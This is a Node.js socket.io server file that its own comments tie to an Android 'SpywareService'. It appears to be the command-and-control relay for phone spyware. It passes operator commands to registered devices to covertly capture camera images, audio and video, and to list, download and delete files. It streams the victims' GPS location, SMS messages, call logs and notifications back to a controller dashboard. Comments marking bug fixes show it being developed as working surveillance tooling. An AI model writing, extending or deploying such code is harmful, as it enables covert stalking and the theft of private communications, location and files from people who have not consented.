// Node.js WebRTC Signaling Backend — Deploy on Render
// Handles ALL signaling events for both StreamingService.java (Java) and SpywareService.kt (Kotlin)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
  res.json({ status: 'WebRTC Signaling Server Running', time: new Date().toISOString() });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', connections: Object.keys(deviceSockets).length });
});

// State maps
const rooms = {};          // socket.id -> { type, deviceId }
const deviceSockets = {};  // deviceId  -> socket.id
const webClients = {};     // webClientId -> socket.id  (Java StreamingService uses this)

io.on('connection', (socket) => {
  console.log('[+] Connection:', socket.id);

  // ─────────────────────────────────────────────────────────────
  // FIX Bug 5 — Java StreamingService.java sends "identify" on connect
  // ─────────────────────────────────────────────────────────────
  socket.on('identify', (type) => {
    if (type === 'android') {
      rooms[socket.id] = { type: 'device', deviceId: socket.id };
      console.log('[identify] Android device:', socket.id);
    } else if (type === 'web') {
      rooms[socket.id] = { type: 'controller', deviceId: null };
      webClients[socket.id] = socket.id;
      console.log('[identify] Web client:', socket.id);
    }
  });

  // ─────────────────────────────────────────────────────────────
  // FIX Bug 5 — Java StreamingService.java listens for "web-client-ready"
  // ─────────────────────────────────────────────────────────────
  socket.on('web-client-ready', (data) => {
    const deviceId = data.deviceId;
    const webClientId = data.webClientId || socket.id;
    rooms[socket.id] = { type: 'controller', deviceId, webClientId };
    socket.join(`ctrl_${deviceId}`);
    // Notify device — Java listens for "web-client-ready"
    io.to(`device_${deviceId}`).emit('web-client-ready', { webClientId: socket.id });
    // Also emit start-stream for Kotlin SpywareService.kt
    io.to(`device_${deviceId}`).emit('start-stream', { controllerId: socket.id });
    console.log('[web-client-ready] for device:', deviceId);
  });

  // ─────────────────────────────────────────────────────────────
  // FIX Bug 5 — Java StreamingService.java emits "signal" for WebRTC
  // ─────────────────────────────────────────────────────────────
  socket.on('signal', (data) => {
    // data.to = target socket.id
    if (data && data.to) {
      io.to(data.to).emit('signal', { ...data, from: socket.id });
    }
  });

  // ─────────────────────────────────────────────────────────────
  // Kotlin SpywareService.kt — register-device + standard WebRTC events
  // ─────────────────────────────────────────────────────────────
  socket.on('register-device', (data) => {
    const deviceId = data.deviceId || socket.id;
    deviceSockets[deviceId] = socket.id;
    rooms[socket.id] = { type: 'device', deviceId };
    socket.join(`device_${deviceId}`);
    console.log('[register-device]', deviceId);
    io.emit('device-list-update', Object.keys(deviceSockets));
  });

  socket.on('join-as-controller', (data) => {
    rooms[socket.id] = { type: 'controller', deviceId: data.deviceId };
    socket.join(`ctrl_${data.deviceId}`);
    io.to(`device_${data.deviceId}`).emit('start-stream', { controllerId: socket.id });
    // Also fire web-client-ready for Java path
    io.to(`device_${data.deviceId}`).emit('web-client-ready', { webClientId: socket.id });
    console.log('[join-as-controller] device:', data.deviceId);
  });

  // Standard WebRTC offer/answer/ICE (Kotlin path)
  socket.on('offer', (data) => {
    io.to(data.to).emit('offer', { sdp: data.sdp, from: socket.id });
  });

  socket.on('answer', (data) => {
    io.to(data.to).emit('answer', { sdp: data.sdp, from: socket.id });
  });

  socket.on('ice-candidate', (data) => {
    io.to(data.to).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
  });

  // ─────────────────────────────────────────────────────────────
  // Capture commands (Dashboard → Device)
  // ─────────────────────────────────────────────────────────────
  socket.on('capture-image', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-image', { camera: data.camera || 'front' });
  });

  socket.on('capture-audio', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-audio', { duration: data.duration || 10 });
  });

  socket.on('capture-video', (data) => {
    io.to(`device_${data.deviceId}`).emit('capture-video', { duration: data.duration || 15, camera: data.camera || 'back' });
  });

  // Torch control
  socket.on('torch', (data) => {
    io.to(`device_${data.deviceId}`).emit('torch', { on: data.on });
  });

  // ─────────────────────────────────────────────────────────────
  // FIX Bug 8 — GPS, SMS, Call Log event handlers (were missing)
  // ─────────────────────────────────────────────────────────────
  socket.on('location', (data) => {
    // data: { deviceId, lat, lng, accuracy, time }
    io.to(`ctrl_${data.deviceId}`).emit('location', data);
    // Also broadcast to all controllers watching this device
    io.emit('location-update', data);
  });

  socket.on('sms', (data) => {
    // data: { deviceId, messages: [{address, body, date, type}] }
    io.to(`ctrl_${data.deviceId}`).emit('sms', data);
  });

  socket.on('call_log', (data) => {
    // data: { deviceId, calls: [{number, type, date, duration}] }
    io.to(`ctrl_${data.deviceId}`).emit('call_log', data);
  });

  socket.on('notification', (data) => {
    // data: { deviceId, appName, title, text, timestamp }
    io.to(`ctrl_${data.deviceId}`).emit('notification', data);
  });

  // ─────────────────────────────────────────────────────────────
  // Media captured (Android → Dashboard relay)
  // ─────────────────────────────────────────────────────────────
  socket.on('media-captured', (data) => {
    io.to(`ctrl_${data.deviceId}`).emit('media-ready', data);
  });

  // File explorer
  socket.on('fs:list', (data) => {
    io.to(`device_${data.deviceId}`).emit('fs:list', data);
  });
  socket.on('fs:list_result', (data) => {
    io.to(`ctrl_${data.deviceId}`).emit('fs:list_result', data);
  });
  socket.on('fs:download', (data) => {
    io.to(`device_${data.deviceId}`).emit('fs:download', data);
  });
  socket.on('fs:download_start', (data) => {
    io.to(`ctrl_${data.deviceId}`).emit('fs:download_start', data);
  });
  socket.on('fs:download_chunk', (data) => {
    io.to(`ctrl_${data.deviceId}`).emit('fs:download_chunk', data);
  });
  socket.on('fs:download_complete', (data) => {
    io.to(`ctrl_${data.deviceId}`).emit('fs:download_complete', data);
  });
  socket.on('fs:delete', (data) => {
    io.to(`device_${data.deviceId}`).emit('fs:delete', data);
  });

  // Disconnect
  socket.on('disconnect', (reason) => {
    console.log('[-] Disconnected:', socket.id, reason);
    for (const [deviceId, sid] of Object.entries(deviceSockets)) {
      if (sid === socket.id) {
        delete deviceSockets[deviceId];
        io.emit('device-list-update', Object.keys(deviceSockets));
        break;
      }
    }
    delete webClients[socket.id];
    delete rooms[socket.id];
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`✅ Signaling server listening on port ${PORT}`);
});
